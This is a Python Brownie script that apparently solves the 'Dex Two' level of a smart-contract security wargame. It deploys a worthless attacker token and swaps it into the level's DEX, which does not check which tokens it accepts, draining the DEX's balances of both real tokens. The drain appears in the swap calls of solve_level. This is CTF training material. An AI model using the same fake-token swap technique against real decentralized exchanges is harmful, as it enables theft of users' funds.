from brownie import web3, DexTwo, SwappableTokenTwo, DexTwoAttack, interface

from scripts.helpful_scripts import (
    get_account,
    get_level_contract,
    submit_instance,
    print_out_if_level_solved,
)

LEVEL_NAME = "23_dex_two"
INTERFACE_CONTRACT = DexTwo
INSTANCE_VALUE_WEI = web3.toWei(0, "ether")
ACCOUNT = get_account()


def solve_level(level_contract):
    token1_address = level_contract.token1()
    token2_address = level_contract.token2()

    SwappableTokenTwo.at(token1_address).approve(
        level_contract, web3.toWei(2, "ether"), {"from": ACCOUNT}
    )
    SwappableTokenTwo.at(token2_address).approve(
        level_contract, web3.toWei(2, "ether"), {"from": ACCOUNT}
    )
    print(
        "Contract allowance : "
        + str(
            interface.IERC20_0_6_0(token1_address).allowance(
                ACCOUNT.address, level_contract.address
            )
        )
    )
    dex_token_amount = 100
    attack1 = DexTwoAttack.deploy(
        "Dogecoin", "DOGE", dex_token_amount * 10, {"from": ACCOUNT}
    )
    print("Account DOGE balance : " + str(attack1.balanceOf(ACCOUNT)))

    attack1.transferFrom(ACCOUNT, level_contract, dex_token_amount)
    level_contract.swap(attack1, token1_address, dex_token_amount, {"from": ACCOUNT})
    level_contract.swap(
        attack1, token2_address, dex_token_amount * 2, {"from": ACCOUNT}
    )
    print_contract_balance(level_contract, token1_address, token2_address)


def get_current_values(level_contract, token1_address, token2_address):
    token1_account_balance = level_contract.balanceOf(token1_address, ACCOUNT.address)
    token2_account_balance = level_contract.balanceOf(token2_address, ACCOUNT.address)
    token1_dex_balance = level_contract.balanceOf(
        token1_address, level_contract.address
    )
    token2_dex_balance = level_contract.balanceOf(
        token2_address, level_contract.address
    )
    return (
        token1_account_balance,
        token2_account_balance,
        token1_dex_balance,
        token2_dex_balance,
    )


def print_contract_balance(level_contract, token1_address, token2_address):
    token1_account_balance = level_contract.balanceOf(token1_address, ACCOUNT.address)
    token2_account_balance = level_contract.balanceOf(token2_address, ACCOUNT.address)
    token1_dex_balance = level_contract.balanceOf(
        token1_address, level_contract.address
    )
    token2_dex_balance = level_contract.balanceOf(
        token2_address, level_contract.address
    )
    print(
        f"Token1 - account balance: {token1_account_balance} dex balance: {token1_dex_balance}"
    )
    print(
        f"Token2 - account balance: {token2_account_balance} dex balance: {token2_dex_balance}"
    )


# brownie run scripts/_23_dex_two.py --network rinkeby-fork
def main():
    level_contract = get_level_contract(
        LEVEL_NAME, INTERFACE_CONTRACT, INSTANCE_VALUE_WEI
    )
    solve_level(level_contract)
    level_solved = submit_instance(level_contract.address)
    print_out_if_level_solved(level_solved, LEVEL_NAME)
    return level_solved
